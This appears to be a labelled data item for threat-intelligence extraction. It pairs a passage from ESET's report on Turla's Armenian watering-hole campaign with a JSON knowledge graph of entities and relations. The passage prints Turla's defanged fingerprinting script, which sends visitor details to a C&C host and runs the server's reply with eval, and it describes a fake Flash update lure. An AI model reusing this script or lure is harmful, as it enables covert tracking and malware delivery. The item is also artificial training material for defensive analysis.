@@ -1,0 +1,160 @@
+
+
+
+Sentence : Fingerprinting and malware delivery
+Upon visiting a compromised webpage, the second-stage malicious JavaScript is delivered by
+skategirlchina[.]com and fingerprints the visitor’s browser. Figure 2 shows the main function of this
+script.
+If it is the first time the user’s browser executes the script, it will add an evercookie with a
+seemingly random MD5 value provided by the server, different at each execution of the script.
+The implementation of the evercookie is based on code available on GitHub. It uses multiple
+storage places such as the local database, local shared objects (Flash cookies), Silverlight
+storage, etc., to store the cookie value. In comparison to a regular cookie, it will be much more
+persistent as it won’t be deleted if the user just deletes the browser’s cookies.
+This evercookie will be used to track whether the user visits one of the compromised websites
+again. When the user comes back for a second time, the previously stored MD5 value will be
+used to identify them.
+Then, it collects several pieces of information including the browser plugin list, the screen
+resolution and various operating system information. This is sent to the C&C server in a POST
+request. If there is a reply, it is assumed to be JavaScript code and is executed using the eval
+function.
+1
+2
+3
+4
+5
+[…]
+function f_ec(){
+var ec = new evercookie({domain:'http://skategirlchina[.]com/wpincludes/data_from_db_top.php',baseurl:'?http://skategirlchina[.]com/wpincludes/data_from_db_top.php'});
+ec.get("ec", function(value) {
+https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ 2/10
+3/13/2020 Tracking Turla: New backdoor delivered via Armenian watering holes | WeLiveSecurity
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+if (value!=undefined){
+var jsonText = {'ec': ''+value+'',
+'scp':screen.pixelDepth==undefined?''+0+'':''+screen.pixelDepth+
+'',
+'scw':''+screen.width+'',
+'sch':''+screen.height+'',
+'bn':''+bn+'',
+'bv':''+bv+'',
+'bc':''+bc+'',
+'osn':''+osn+'',
+'osv':''+osv+'',
+'osc':''+osc+'',
+'adr':''+adr+'',
+'pdr':''+pdr+'',
+'fla':''+fla+'',
+'jav':''+jav+'',
+'wmp':''+wmp+'',
+'msw':''+msw+'',
+'qui':''+qui+'',
+'sho':''+sho+'',
+'type':'info',
+'tiz': ''+(new Date().getTimezoneOffset()/60)+''
+};
+var json = JSON.stringify(jsonText);
+ajax({
+content_type : 'application/json',
+url: 'http://skategirlchina[.]com/wp-includes/data_from_db_top.php?
+http://skategirlchina[.]com/wp-includes/data_from_db_top.php',
+crossDomain: true,
+type: 'POST',
+https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ 3/10
+3/13/2020 Tracking Turla: New backdoor delivered via Armenian watering holes | WeLiveSecurity
+35
+36
+37
+38
+39
+40
+41
+42
+43
+data: json,
+onSuccess: function(m){
+eval(m);
+}
+});
+}
+else{
+ec.set('ec', '');
+setTimeout(f_ec,1500);
+}
+Figure 2. Fingerprint script (malicious URLs defanged)
+If the visitor is deemed interesting, the server replies with a piece of JavaScript code that creates
+an iframe. Data from ESET telemetry suggests that, for this campaign, only a very limited number
+of visitors were considered interesting by Turla’s operators.
+This iframe displays a fake Adobe Flash update warning to the user, shown in Figure 3, in order
+to trick them into downloading a malicious Flash installer.
+Figure 3. Fake Adobe Flash update iframe
+https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ 4/10
+3/13/2020 Tracking Turla: New backdoor delivered via Armenian watering holes | WeLiveSecurity
+We did not observe the use of any browser vulnerabilities. The compromise attempt relies only on
+this social engineering trick. Once the malicious executable is downloaded from the same server
+as the iframe’s JavaScript, and if the user launches it manually, a Turla malware variant and a
+legitimate Adobe Flash program are installed.
+Figure 4 is an overview of the compromise process from initially visiting one of the compromised
+Armenian websites to the delivery of a malicious payload.
+https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ 5/10
+3/13/2020 Tracking Turla: New backdoor delivered via Armenian watering holes | WeLiveSecurity
+Figure 4. Overview of the watering hole operation
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "skategirlchina[.]com", "type" : "CCSH"},
+        {"id": 2, "description": "evercookie with MD5 value", "type" : "TAMP"},
+        {"id": 3, "description": "GitHub code for evercookie implementation", "type" : "DOCF"},
+        {"id": 4, "description": "C&C server", "type" : "CCSH"},
+        {"id": 5, "description": "browser plugin list", "type" : "TAMP"},
+        {"id": 6, "description": "screen resolution", "type" : "TAMP"},
+        {"id": 7, "description": "operating system information", "type" : "OPPS"},
+        {"id": 8, "description": "JavaScript code from server reply", "type" : "EXEF"},
+        {"id": 9, "description": "iframe displaying fake Adobe Flash update warning", "type" : "DOCF"},
+        {"id": 10, "description": "malicious Flash installer", "type" : "EXEF"},
+        {"id": 11, "description": "Turla malware variant", "type" : "EXEF"},
+        {"id": 12, "description": "legitimate Adobe Flash program", "type" : "APPS"}
+    ],
+    "edges": [
+        {"source": 1, "target": 4, "rel_name" : "sends information to"},
+        {"source": 1, "target": 9, "rel_name" : "hosts"},
+        {"source": 1, "target": 10, "rel_name" : "delivers"},
+        {"source": 2, "target": 4, "rel_name" : "used to identify user by"},
+        {"source": 3, "target": 2, "rel_name" : "provides implementation for"},
+        {"source": 5, "target": 4, "rel_name" : "sent to"},
+        {"source": 6, "target": 4, "rel_name" : "sent to"},
+        {"source": 7, "target": 4, "rel_name" : "sent to"},
+        {"source": 8, "target": 9, "rel_name" : "creates"},
+        {"source": 9, "target": 10, "rel_name" : "tricks user into downloading"},
+        {"source": 10, "target": 11, "rel_name" : "installs along with"},
+        {"source": 10, "target": 12, "rel_name" : "installs"}
+    ]
+}
